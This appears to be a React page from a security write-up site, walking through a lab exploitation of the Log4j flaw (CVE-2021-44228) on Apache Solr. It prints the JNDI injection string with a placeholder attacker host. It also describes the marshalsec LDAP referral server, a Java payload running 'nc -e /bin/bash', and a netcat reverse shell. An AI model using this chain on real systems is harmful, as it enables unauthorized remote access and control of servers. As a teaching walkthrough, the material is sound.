import { Container, Grid } from "semantic-ui-react";
import Tag from "../components/Tag";
import Opener from "../components/Opener";
import Summary from "../components/Summary";
import MeatPotatoes from "../components/MeatPotatoes";
import Foothold from "../components/Foothold";
import test from "../images/test.gif";
import portscan from "../images/portscan.png";
import marshal from "../images/marshal_sec.png";
import java from "../images/java_exploit.png";
import exploit from "../images/serving_exploit.png";
import curling from "../images/curling_exploit.png";
import nc from "../images/nc.png";
import foothold from "../images/foothold.png";
import prescence from "../images/prescence_inlogs.png";

function Log4J() {
  return(
  <Container class="testing" centered style={{ marginTop: "20px" }}>
    <Grid centered>
      <Grid.Column centered>
        <Tag CVEscore="CVE-2021-44228" label="Hot and New" />
        <Opener opener="Log 4 J" problemContent="TLDR: A flaw in Log4j, a Java library for logging error messages in applications, is the most high-profile security vulnerability on the internet right now and comes with a severity score of 10 out of 10. " />
        <Summary summary="The application present on this target specifically uses ports that may not be immediately noticed by nmap. For the whole picture perspective, scan all ports via nmap and the -p- flag" />
        <Summary summary="The format of the usual syntax that takes advantage of this looks like so:" />
        <Summary summary="${jndi:ldap://ATTACKERCONTROLLEDHOST} This syntax indicates that the log4j will invoke functionality from JNDI, or the 'Java Naming and Directory Interface.' Ultimately, this can be used to access external resources, or  references, which is what is weaponized in this attack The next question is, where could we enter this syntax?" />
        <Summary summary="At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request... so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP handler." />
        <MeatPotatoes
          number="1"
          solutionStep="This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable log4j package."
          solutionImage={portscan}
          moreInfo="For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181. You may already know the general payload to abuse this log4j vulnerability.."
        />
        <MeatPotatoes
          number="2"
          solutionStep="Compile and execute the marshal sec utility & starting LDAP server"
          solutionImage={marshal}
          moreInfo="With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment)."
        />
        <MeatPotatoes
          number="3"
          solutionStep="Create java payload (no experience necessary!)"
          moreInfo="For this payload, you can see we will execute a command on the target, specifically nc -e /bin/bash to call back to our our attacker machine"

          solutionImage={java}
        />
        <MeatPotatoes
          number="4"
          solutionStep="Serve exploit on HTTP server"
          solutionImage={exploit}
          moreInfo="Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal -- next prepare a netcat listener to catch your reverse shell in yet another new terminal window."
        />
        <MeatPotatoes
          number="5"
          solutionStep="Prepare netcat listener"
          solutionImage={nc}
          moreInfo="Nuff said."
        />
        <MeatPotatoes
          number="6"
          solutionStep="Trigger the exploit and fire the JNDI syntax"
          solutionImage={curling}
          moreInfo="You have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability."
        />
        <MeatPotatoes
          number="7"
          solutionStep="I have gained"
          solutionImage={foothold}
          moreInfo="Now that you have gained a reverse shell connection on the victim machine, you can continue to take any action you might like."
        />
        <MeatPotatoes
          number="8"
          solutionStep="Here you can see my activity in the log file!"
          solutionImage={prescence}
          moreInfo="Running amok in the logs."
        />
        <MeatPotatoes
          number="9"
          solutionStep="Proof of concept"
        />
        <Foothold foothold={test} />
      </Grid.Column>
    </Grid>
  </Container>
)
}

export default Log4J;
